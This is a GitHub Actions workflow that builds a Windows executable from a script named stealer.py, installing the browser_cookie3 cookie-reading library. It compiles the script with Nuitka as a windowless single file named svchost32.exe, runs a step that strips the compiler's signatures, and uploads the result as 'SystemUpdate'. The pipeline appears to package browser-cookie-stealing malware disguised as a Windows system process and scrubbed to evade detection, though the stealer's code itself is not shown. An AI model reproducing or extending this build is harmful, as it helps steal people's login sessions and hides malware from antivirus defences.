name: Build EXE
on: [push]
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.10'
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install nuitka ordered-set zstandard
          pip install browser_cookie3

      - name: Compile with Nuitka
        run: |
          python -m nuitka --onefile --windows-console-mode=disable --mingw64 --assume-yes-for-downloads --output-filename=svchost32.exe stealer.py

      - name: Clean Nuitka Signatures
        run: |
          python clean_exe.py svchost32.exe

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: SystemUpdate
          path: svchost32_clean.exe
